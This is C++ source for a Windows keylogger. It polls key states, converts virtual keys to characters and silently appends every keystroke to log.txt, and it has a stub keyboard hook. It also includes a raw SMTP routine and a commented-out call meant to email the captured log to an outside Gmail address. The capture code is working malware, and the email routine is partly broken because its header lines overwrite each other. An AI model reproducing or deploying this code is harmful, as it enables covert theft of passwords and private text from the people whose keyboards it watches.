#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <thread>
#include <string>
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <assert.h>

/*

DATA STRUCTURES

*/

//possible use of struct when keyboard hook implementation finished for simplification
struct KEYMAP {
	public:
		char* keyMapUP;
		char* keyMapLOW;
		char* numMap;
		char* symMap;

		void set(char* UP, char* LOW, char* NUM, char* SYM) {
			keyMapUP = UP;
			keyMapLOW = LOW;
			numMap = NUM;
			symMap = SYM;
		}
};

/*

FUNCTIONS

*/

int send_email(const char* server, const char* to, const char* from, const char* subject, const char* msg) {
	//work in progress
	SOCKET socketfd;
	WSADATA wsaData;
	hostent* host;
	sockaddr_in dest;

	int sent;
	char line[200];
	if (WSAStartup(0x202, &wsaData) != SOCKET_ERROR) {
		if ((host = gethostbyname(server)) != NULL) {
			printf("now constructing email\n");
			//set memory
			memset(&dest, 0, sizeof(dest));
			memcpy(&(dest.sin_addr), host->h_addr, host->h_length);
			//prepare destination
			dest.sin_family = host->h_addrtype;
			dest.sin_port = htons(25);
			//get socket
			socketfd = socket(AF_INET, SOCK_STREAM, 0);
			//connect
			connect(socketfd, (struct sockaddr*) & dest, sizeof(dest));
			//send command lines
			strcpy(line, "hello me.someplace.com\n");
			sent = send(socketfd, line, strlen(line), 0);
			Sleep(500);

			strcpy(line, "MAIL FROM:<");
			strncat(line, from, strlen(from));
			strncat(line, ">\n", 3);
			sent = send(socketfd, line, strlen(line), 0);
			Sleep(500);

			strcpy(line, "RCPT TO:<");
			strncat(line, to, strlen(to));
			strncat(line, ">\n", 3);
			sent = send(socketfd, line, strlen(line), 0);
			Sleep(500);

			strcpy(line, "DATA\n");
			sent = send(socketfd, line, strlen(line), 0);
			Sleep(500);

			strcpy(line, "To: ");
			strcpy(line, to);
			strcpy(line, "\n");
			strcpy(line, "From: ");
			strcpy(line, from);
			strcpy(line, "\n");
			strcpy(line, "Subject: ");
			strcpy(line, subject);
			strcpy(line, "\n");
			strcpy(line, msg);
			strcpy(line, "\r\n.\r\n");
			sent = send(socketfd, line, strlen(line), 0);
			Sleep(500);

			strcpy(line, "quit\n");
			sent = send(socketfd, line, strlen(line), 0);
			Sleep(500);
		}
	}
	//close socket and wsadata
	closesocket(socketfd);
	WSACleanup();
	return 0;
}

std::string convert_vKey(int key, int is_cap) {
	std::string sKey;
	//character maps for virtual keys to chars
	char keyMapUP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char keyMapLOW[] = "abcdefghijklmnopqrstuvwxyz";
	char numMap[] = "0123456789*+";
	char symMap[] = "-./";
	if (key == VK_F8) {
		sKey = "\n*** EXIT ***\n";
	}
	else if (key == VK_BACK) {
		sKey = " [BACK] ";
	}
	else if (key == VK_TAB) {
		sKey = " [TAB] ";
	}
	else if (key == VK_SHIFT) {
		sKey = " [SHIFT] ";
	}
	else if (key == VK_RETURN) {
		sKey = "[ENTER] ";
	}
	else if (key == VK_ESCAPE) {
		sKey = " [ESC] ";
	}
	else if (key == VK_SPACE) {
		sKey = " ";
	}
	else if (key > 64 && key < 91) {
		//key is A-Z or a-z
		if (is_cap) {
			//key is A-Z
			sKey = keyMapUP[key % 65];
		}
		else {
			//key is a-z
			sKey = keyMapLOW[key % 65];
		}
	}
	else if (key > 47 && key < 58) {
		//key is 0-9
		sKey = numMap[key % 48];
	}
	else if (key > 95 && key < 108) {
		//key is 0-9 or 
		sKey = numMap[key % 96];
	}
	else if (key > 108 && key < 112) {
		//key is - . / 
		sKey = symMap[key % 109];
	}
	else {
		//key is other
		if (key != 160 && key != 161) {
			sKey = std::to_string(key);
		}
	}
	return sKey;
}

int log_key(int key, int is_cap) {
	std::string sKey = convert_vKey(key, is_cap);
	std::cout << sKey << std::endl;
	std::ofstream theFile;
	theFile.open("log.txt", std::ofstream::out | std::ofstream::app);
	if (theFile.is_open()) {
		theFile << sKey;
		std::cout << sKey << std::endl;
	}
	else {
		std::cout << "error opening file" << std::endl;
	}
	theFile.close();
	return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	//work in progress
	//keyboard hook log implementation
	//nCode: HC_ACTION > 0 on actual key returned, <=0 on nothing
	//WPARAM: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, WM_SYSKEYUP
	//LPARAM: pointer to struct holding virtual key
	if (nCode == HC_ACTION) {
		switch (wParam) {
			case WM_KEYUP:
				//keydown to keyup
				KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
				int key = p->vkCode;
				break;
			/*
			case WM_SYSKEYDOWN:
				//keyup to keydown + ALT or F10
			case WM_SYSKEYUP:
				//keydown to keyup + ALT or F10
			case WM_KEYDOWN:
				//keyup to keydown
			*/
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int zero_array(int* array, int size) {
	for (int i = 0; i<size; i++) {
		array[i] = 0;
	}
	return 0;
}

int GetAsyncLogger() {
	//GetAsyncKeyState() key log implementation
	int active = 1;
	const int size = 256;
	int activityMap[size];
	zero_array(activityMap, size);
	//send_email("gmail-smtp-in.l.google.com","not4keylogging@gmail.com","not4keylogging@gmail.com","- keylog -","log.txt");
	while (active) {
		//poll every 50ms
		Sleep(50);
		for (int i = 8; i < 255; i++) {
			if (GetAsyncKeyState(i) & 0x8000) {
				//checks only if key is pressed down
				if (i == 119) {
					//F8 ends keylogger
					active = 0;
				}
				if (activityMap[i] == 0) {
					//unique key press
					int is_cap = 0;
					if (GetKeyState(VK_CAPITAL) & 0x1) {
						//capts on
						is_cap = 1;
					}
					log_key(i, is_cap);
				}
				activityMap[i] = 1;
			}
			else {
				//key not pressed, reset activity to 0
				activityMap[i] = 0;
			}
		}
	}
	return 0;
}

int log_key(int key, int is_cap);
int zero_array(int* array, int size);
int send_email(const char* server, const char* to, const char* from, const char* subject, const char* msg);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
std::string convert_vKey(int key, int is_cap);
int GetAsyncLogger();

int main() {
	std::thread GAKSimplementation;
	GAKSimplementation = std::thread(GetAsyncLogger);
	GAKSimplementation.join();
	return 0;
}